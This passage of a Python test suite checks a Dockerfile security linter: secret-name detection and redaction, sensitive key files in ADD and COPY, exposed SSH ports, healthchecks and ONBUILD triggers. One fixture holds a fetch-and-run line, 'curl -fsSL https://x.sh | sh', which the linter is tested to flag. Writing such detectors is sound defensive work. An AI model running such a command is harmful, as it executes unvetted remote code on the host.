            "APP_SECRET",
            "SECRET_KEY_BASE",
            "AWS_SECRET_ACCESS_KEY",
            "TOKEN",
            "GITHUB_TOKEN",
            "npm-token",
            "githubToken",
            "API_KEY",
            "APIKEY",
            "apiKey",
            "STRIPE_API_KEY",
            "PRIVATE_KEY",
            "AUTH_TOKEN",
            "ACCESS_KEY",
            "CREDENTIALS",
            "DB_CREDENTIAL",
        ],
    )
    def test_names_that_look_like_secrets_are_flagged_with_a_literal_value(self, key: str) -> None:
        props = self.env(f"{key}=Zx9fQw3Lm")
        assert props["has_secret_pattern"] is True, key

    @pytest.mark.parametrize(
        "key",
        [
            "AUTHOR",
            "AUTHORS",
            "AUTH",
            "KEYBOARD",
            "KEYBOARD_LAYOUT",
            "KEY_VERSION",
            "KEY",
            "PUBLIC_KEY_PATH",
            "PATH_TO_TOKEN_FILE",
            "SECRET_NAME",
            "SECRET_FILE",
            "TOKEN_URL",
            "PASSWORD_FILE",
            "DB_PASSWORD_PATH",
            "TOKEN_ID",
            "SECRET_ID",
            "MONKEY",
            "TOKENIZER",
            "PATH",
            "HOME",
        ],
    )
    def test_names_that_do_not_look_like_secrets_are_not_flagged(self, key: str) -> None:
        assert self.env(f"{key}=Zx9fQw3Lm")["has_secret_pattern"] is False, key

    @pytest.mark.parametrize(
        "value",
        [
            "",
            '""',
            "${CI_TOKEN}",
            "$CI_TOKEN",
            "prefix-${TOKEN}",
            "/run/secrets/db_password",
            "./secret.txt",
            "changeme",
            "CHANGE_ME",
            "<your-password>",
            '"{{ password }}"',
            "xxxxxxxx",
            "********",
            "placeholder",
            "TODO",
        ],
    )
    def test_empty_placeholder_path_and_reference_values_are_not_flagged(self, value: str) -> None:
        assert self.env(f"DB_PASSWORD={value}")["has_secret_pattern"] is False

    def test_the_value_is_never_stored_in_a_property(self) -> None:
        resource = of_type("FROM a\nENV DB_PASSWORD=hunter2 APP=web\n", "dockerfile_env")[0]
        assert "hunter2" not in repr(resource.properties)
        assert "hunter2" not in resource.name
        assert resource.properties["arguments"] == "DB_PASSWORD=<redacted> APP=web"

    def test_the_legacy_form_masks_the_value_too(self) -> None:
        resource = of_type("FROM a\nENV API_TOKEN hunter2\n", "dockerfile_env")[0]
        assert "hunter2" not in repr(resource.properties)
        assert resource.properties["arguments"] == "API_TOKEN <redacted>"

    def test_a_value_that_is_not_flagged_stays_in_the_text(self) -> None:
        props = self.env("APP=web")
        assert props["arguments"] == "APP=web"

    def test_arg_with_a_literal_default_is_flagged(self) -> None:
        props = self.env("NPM_TOKEN=abc123xyz", "ARG")
        assert props["has_secret_pattern"] is True
        assert props["secret_keys"] == ["NPM_TOKEN"]

    def test_arg_without_a_default_is_informational_not_a_secret(self) -> None:
        props = self.env("TOKEN", "ARG")
        assert props["has_secret_pattern"] is False
        assert props["secret_keys"] == []
        assert props["secret_keys_without_default"] == ["TOKEN"]

    def test_arg_with_several_names(self) -> None:
        props = self.env("A B=1 NPM_TOKEN=abc123", "ARG")
        assert props["keys"] == ["A", "B", "NPM_TOKEN"]
        assert props["secret_keys"] == ["NPM_TOKEN"]

    def test_the_pairs_record_the_kind_of_value_never_the_value(self) -> None:
        props = self.env("A=literal B=${X} C= D=/path E=changeme")
        assert props["pairs"] == [
            {"key": "A", "value_kind": "literal"},
            {"key": "B", "value_kind": "variable"},
            {"key": "C", "value_kind": "empty"},
            {"key": "D", "value_kind": "path"},
            {"key": "E", "value_kind": "placeholder"},
        ]

    def test_an_empty_env_line_does_not_crash(self) -> None:
        props = first("FROM a\nENV\n", "dockerfile_env")
        assert props["keys"] == []
        assert props["has_secret_pattern"] is False


class TestHeuristicsAddAndCopy:
    def add(self, args: str) -> dict[str, Any]:
        return first(f"FROM a\nADD {args}\n", "dockerfile_add")

    def copy(self, args: str) -> dict[str, Any]:
        return first(f"FROM a\nCOPY {args}\n", "dockerfile_copy")

    def test_add_with_a_checksum_and_a_url_is_a_url_add_not_a_local_add(self) -> None:
        props = self.add("--checksum=sha256:abc https://example.com/f.tar /opt/")
        assert props["is_url_add"] is True
        assert props["is_local_add"] is False
        assert props["has_checksum"] is True
        assert props["sources"] == ["https://example.com/f.tar"]

    def test_add_without_a_checksum(self) -> None:
        props = self.add("https://example.com/f.tar /opt/")
        assert props["is_url_add"] is True
        assert props["has_checksum"] is False

    @pytest.mark.parametrize(
        "source", ["http://x/y", "https://x/y", "ftp://x/y", "git@github.com:org/repo.git"]
    )
    def test_url_forms(self, source: str) -> None:
        assert self.add(f"{source} /opt/")["is_url_add"] is True

    def test_a_local_archive_is_the_legitimate_use_of_add(self) -> None:
        for source in ("rootfs.tar.gz", "app.tgz", "base.tar.xz", "x.tar", "y.tar.zst", "Z.TAR.GZ"):
            props = self.add(f"{source} /")
            assert props["is_local_add"] is False, source
            assert props["is_url_add"] is False

    def test_a_local_file_is_a_local_add(self) -> None:
        assert self.add("config/app.conf /etc/")["is_local_add"] is True
        assert self.add(". /app")["is_local_add"] is True

    def test_a_local_file_next_to_an_archive_is_a_local_add(self) -> None:
        assert self.add("rootfs.tar.gz extra.conf /")["is_local_add"] is True

    def test_add_flags_are_not_sources(self) -> None:
        props = self.add("--chown=app:app server.pem /etc/ssl/")
        assert props["sources"] == ["server.pem"]
        assert props["has_sensitive_file"] is True
        assert props["has_chown"] is True

    def test_an_add_whose_source_is_a_variable_is_unknown(self) -> None:
        assert is_unknown(self.add("$ARCHIVE /opt/")["is_local_add"])

    def test_json_form_add(self) -> None:
        props = self.add('["id_rsa", "/root/.ssh/"]')
        assert props["sources"] == ["id_rsa"]
        assert props["destination"] == "/root/.ssh/"
        assert props["has_sensitive_file"] is True

    def test_json_form_copy_of_a_key(self) -> None:
        props = self.copy('["server.key", "/etc/"]')
        assert props["has_sensitive_file"] is True
        assert props["sources"] == ["server.key"]

    @pytest.mark.parametrize(
        "source",
        [
            "server.key",
            "tls/cert.pem",
            "store.p12",
            "store.pfx",
            "id_rsa",
            "~/.ssh/id_rsa",
            ".env",
            "deploy/.env",
        ],
    )
    def test_sensitive_sources(self, source: str) -> None:
        assert self.copy(f"{source} /dest/")["has_sensitive_file"] is True

    @pytest.mark.parametrize(
        "source", ["server.crt", "app.py", "id_rsa.pub", "keyboard.py", "env.example", "dotenv"]
    )
    def test_ordinary_sources(self, source: str) -> None:
        assert self.copy(f"{source} /dest/")["has_sensitive_file"] is False

    def test_a_flag_is_not_a_source_even_if_it_mentions_a_key(self) -> None:
        props = self.copy("--chown=server.key:x app.py /app/")
        assert props["has_sensitive_file"] is False

    def test_the_destination_is_never_a_source(self) -> None:
        assert self.copy("app.py /etc/server.key")["has_sensitive_file"] is False

    def test_chown_is_only_chown_not_chmod(self) -> None:
        assert self.copy("--chmod=755 app /app")["has_chown"] is False
        assert self.copy("--chown=a:b app /app")["has_chown"] is True
        assert self.copy("--chown=a:b --chmod=755 app /app")["has_chown"] is True

    def test_copy_from_records_the_stage(self) -> None:
        assert self.copy("--from=build /out /out")["from_stage"] == "build"
        assert self.copy("app /app")["from_stage"] == ""


class TestCopyOwnership:
    def missing(self, text: str) -> list[bool]:
        return [r.properties["chown_missing"] for r in of_type(text, "dockerfile_copy")]

    def test_a_final_stage_copy_without_chown_for_a_non_root_image(self) -> None:
        assert self.missing("FROM a\nCOPY x /x\nUSER app\n") == [True]

    def test_a_root_image_has_no_ownership_mismatch(self) -> None:
        assert self.missing("FROM a\nCOPY x /x\n") == [False]
        assert self.missing("FROM a\nCOPY x /x\nUSER root\n") == [False]
        assert self.missing("FROM a\nCOPY x /x\nUSER 0:0\n") == [False]

    def test_an_unknown_user_is_not_judged(self) -> None:
        assert self.missing("FROM a\nARG U\nCOPY x /x\nUSER ${U}\n") == [False]

    def test_copy_from_another_stage_is_excluded(self) -> None:
        text = "FROM a AS b\nFROM c\nCOPY --from=b /x /x\nUSER app\n"
        assert self.missing(text) == [False]

    def test_a_build_stage_copy_is_excluded(self) -> None:
        text = "FROM a AS b\nCOPY x /x\nUSER app\nFROM c\nCOPY --chown=app y /y\nUSER app\n"
        assert self.missing(text) == [False, False]

    def test_a_copy_with_chown_is_excluded(self) -> None:
        assert self.missing("FROM a\nCOPY --chown=app:app x /x\nUSER app\n") == [False]

    def test_chmod_alone_does_not_set_the_owner(self) -> None:
        assert self.missing("FROM a\nCOPY --chmod=755 x /x\nUSER app\n") == [True]

    def test_an_inherited_non_root_user_counts_for_the_child_stage(self) -> None:
        text = "FROM a AS base\nUSER app\nFROM base\nCOPY x /x\n"
        assert self.missing(text) == [True]

    def test_the_summary_counts_the_missing_chowns(self) -> None:
        assert summary("FROM a\nCOPY x /x\nCOPY y /y\nUSER app\n")["copy_without_chown"] == 2


class TestExpose:
    def ports(self, args: str) -> dict[str, Any]:
        return first(f"FROM a\nEXPOSE {args}\n", "dockerfile_expose")

    def test_every_port_is_stored_not_only_the_last(self) -> None:
        assert self.ports("80 443 8080")["ports"] == [80, 443, 8080]

    def test_a_protocol_suffix_is_removed(self) -> None:
        assert self.ports("53/udp 80/tcp")["ports"] == [53, 80]

    def test_a_range_is_stored_as_a_range_not_expanded(self) -> None:
        props = self.ports("8000-8010 1-65535")
        assert props["ports"] == []
        assert props["port_ranges"] == [[8000, 8010], [1, 65535]]

    def test_an_unresolved_variable_is_an_unknown_port_marker(self) -> None:
        props = self.ports("${PORT} 80")
        assert props["unknown_ports"] == ["${PORT}"]
        assert props["ports"] == [80]

    def test_an_arg_or_env_default_resolves_the_port(self) -> None:
        text = "FROM a\nARG PORT=8080\nENV ADMIN=9000\nEXPOSE ${PORT} $ADMIN\n"
        assert first(text, "dockerfile_expose")["ports"] == [8080, 9000]

    def test_nonsense_and_out_of_range_ports_are_ignored(self) -> None:
        assert self.ports("abc 99999 70000-70010 80")["ports"] == [80]

    def test_the_audit_example(self) -> None:
        props = summary("FROM a\nEXPOSE 8000-8010 ${PORT} 22-25\n")
        assert props["has_ssh_exposed"] is True
        assert props["exposed_port_ranges"] == [[8000, 8010], [22, 25]]
        assert props["unknown_exposed_ports"] == ["${PORT}"]
        assert props["has_privileged_port"] is True

    def test_a_range_that_does_not_include_22_is_not_ssh(self) -> None:
        props = summary("FROM a\nEXPOSE 8000-8010 23-25\n")
        assert props["has_ssh_exposed"] is False

    def test_a_single_port_22_is_ssh(self) -> None:
        assert summary("FROM a\nEXPOSE 22/tcp\n")["has_ssh_exposed"] is True

    def test_a_privileged_port_alone(self) -> None:
        assert summary("FROM a\nEXPOSE 443\n")["has_privileged_port"] is True
        assert summary("FROM a\nEXPOSE 8443\n")["has_privileged_port"] is False

    def test_an_unknown_port_does_not_set_ssh(self) -> None:
        assert summary("FROM a\nEXPOSE ${P}\n")["has_ssh_exposed"] is False

    def test_a_wide_range_costs_nothing(self) -> None:
        props = summary("FROM a\nEXPOSE 1-65535\n")
        assert props["exposed_ports"] == []
        assert props["has_ssh_exposed"] is True


class TestHealthcheck:
    @pytest.mark.parametrize(
        "line",
        [
            "HEALTHCHECK CMD curl -f http://localhost/",
            "HEALTHCHECK --interval=30s --timeout=3s CMD true",
            'HEALTHCHECK CMD ["true"]',
            "healthcheck cmd true",
        ],
    )
    def test_a_healthcheck_is_a_healthcheck(self, line: str) -> None:
        assert summary(f"FROM a\n{line}\n")["has_healthcheck"] is True

    @pytest.mark.parametrize(
        "line", ["HEALTHCHECK NONE", "healthcheck none", "HEALTHCHECK --interval=5s NONE"]
    )
    def test_none_turns_it_off(self, line: str) -> None:
        assert summary(f"FROM a\n{line}\n")["has_healthcheck"] is False


class TestOnbuild:
    TEXT = (
        "FROM node:20-alpine AS base\n"
        "WORKDIR /app\n"
        "ONBUILD COPY package.json ./\n"
        "ONBUILD RUN curl -fsSL https://x.sh | sh\n"
        "ONBUILD USER root\n"
        "ONBUILD HEALTHCHECK NONE\n"
        "ONBUILD EXPOSE 22\n"
        "ONBUILD WORKDIR /other\n"
        "USER node\n"
    )

    def test_triggers_are_unwrapped_into_their_instruction_type(self) -> None:
        result = parse(self.TEXT)
        types = [r.resource_type for r in result.resources if r.properties.get("onbuild")]
        assert types == [
            "dockerfile_copy",
            "dockerfile_run",
            "dockerfile_user",
            "dockerfile_healthcheck",
            "dockerfile_expose",
            "dockerfile_workdir",
        ]
        assert not [r for r in result.resources if r.resource_type == "dockerfile_onbuild"]

    def test_command_checks_run_on_the_trigger(self) -> None:
        run = next(r for r in of_type(self.TEXT, "dockerfile_run") if r.properties["onbuild"])
        assert run.properties["has_curl_pipe"] is True

    def test_the_summary_ignores_the_triggers(self) -> None:
        props = summary(self.TEXT)
        assert props["user_value"] == "node"
        assert props["is_root_user"] is False
        assert props["has_healthcheck"] is False
        assert props["exposed_ports"] == []
        assert props["has_ssh_exposed"] is False
        assert props["has_workdir"] is True

    def test_a_trigger_copy_is_not_judged_for_ownership(self) -> None:
        text = "FROM a\nONBUILD COPY x /x\nUSER app\n"
        assert first(text, "dockerfile_copy")["chown_missing"] is False

    def test_a_trigger_does_not_count_as_an_add(self) -> None:
        assert summary("FROM a\nONBUILD ADD x /x\n")["add_count"] == 0
        assert summary("FROM a\nADD x /x\n")["add_count"] == 1

    def test_a_trigger_env_does_not_define_variables(self) -> None:
        text = "FROM a\nONBUILD ENV APP_USER=app\nUSER ${APP_USER}\n"
        assert is_unknown(summary(text)["user_value"])

    def test_an_invalid_trigger_is_a_diagnostic(self) -> None:
        result = parse("FROM a\nONBUILD ONBUILD RUN x\n")
        assert [d.code for d in result.diagnostics] == ["dockerfile.skipped_line"]


class TestSummaryProperties:
    def test_is_non_minimal(self) -> None:
        for image in (
            "ubuntu:22.04",
            "debian:12",
            "debian",
            "centos:7",
            "fedora:40",
            "amazonlinux:2023",
        ):
            assert summary(f"FROM {image}\n")["is_non_minimal"] is True, image

    def test_minimal_variants_are_minimal(self) -> None:
        for image in (
            "debian:12-slim",
            "ubuntu:22.04-minimal",
            "amazonlinux:2023-minimal",
            "alpine:3.20",
            "gcr.io/distroless/static-debian12",
            "busybox:1.36",
            "scratch",
            "python:3.12",
            "node:20",
            "registry.access.redhat.com/ubi9/ubi-minimal:9.4",
            "cgr.dev/chainguard/wolfi-base",
        ):
            assert summary(f"FROM {image}\n")["is_non_minimal"] is False, image

    def test_a_mirror_registry_does_not_hide_the_family(self) -> None:
        assert summary("FROM mirror.gcr.io/library/ubuntu:22.04\n")["is_non_minimal"] is True

    def test_has_digest_pin(self) -> None:
        assert summary("FROM a:1\n")["has_digest_pin"] is False
        assert summary("FROM a:1@sha256:" + "f" * 64 + "\n")["has_digest_pin"] is True
        assert summary("FROM scratch\n")["has_digest_pin"] is False
        assert summary("FROM scratch\n")["base_kind"] == "scratch"

    def test_the_summary_has_the_documented_property_names(self) -> None:
        props = summary("FROM a\n")
        assert {
            "has_user",
            "user_value",
            "is_root_user",
            "has_healthcheck",
            "has_workdir",
            "exposed_ports",
            "base_image",
            "has_digest_pin",
            "is_non_minimal",
            "uses_latest_tag",
            "final_stage_uses_latest_tag",
            "stage_count",
            "has_ssh_exposed",
            "entrypoint_count",
            "add_count",
            "copy_without_chown",
        } <= set(props)

    def test_entrypoints_are_counted_in_the_final_stage(self) -> None:
        text = 'FROM a AS b\nENTRYPOINT ["x"]\nFROM c\nENTRYPOINT ["y"]\n'
        assert summary(text)["entrypoint_count"] == 1

    def test_the_summary_name_uses_the_final_base_image(self) -> None:
        result = parse("FROM golang AS build\nFROM alpine:3.20\n")
        assert result.resources[-1].name == "Dockerfile (alpine:3.20)"


class TestFixtures:
    def test_the_lowercase_fixture_fires_as_if_it_were_uppercase(self) -> None:
        text = (DOCKER_FIXTURES / "lowercase.Dockerfile").read_text()
        props = summary(text)
        assert props["is_root_user"] is True
        assert props["has_user"] is True
        assert first(text, "dockerfile_env")["secret_keys"] == ["db_password"]

    def test_the_multistage_platform_fixture_judges_the_final_stage(self) -> None:
        text = (DOCKER_FIXTURES / "multistage_platform.Dockerfile").read_text()
        props = summary(text)
        assert props["has_user"] is False
        assert props["has_healthcheck"] is False
        assert props["has_workdir"] is False
        assert props["base_image"] == "debian:latest"
        assert props["final_stage_uses_latest_tag"] is True
        assert props["stage_count"] == 3

    def test_the_user_forms_fixture(self) -> None:
        text = (DOCKER_FIXTURES / "user_forms.Dockerfile").read_text()
        users = [r.properties for r in of_type(text, "dockerfile_user")]
        assert [u["is_root"] for u in users][:2] == [True, True]
        assert is_unknown(users[2]["is_root"])
        assert summary(text)["is_root_user"] is True

    def test_the_heuristics_fixture(self) -> None:
        text = (DOCKER_FIXTURES / "heuristics.Dockerfile").read_text()
        runs = {r.start_line: r.properties for r in of_type(text, "dockerfile_run")}
        assert [p["has_curl_pipe"] for p in runs.values()] == [False, False, True, True]
        assert [p["has_sudo"] for p in runs.values()] == [False, False, True, False]
        envs = of_type(text, "dockerfile_env")
        assert [e.properties["secret_keys"] for e in envs] == [
            [],
            [],
            ["DB_PASSWORD"],
            ["SERVICE_SECRET"],
        ]
        assert summary(text)["has_ssh_exposed"] is True
        assert summary(text)["user_value"] == "10001"
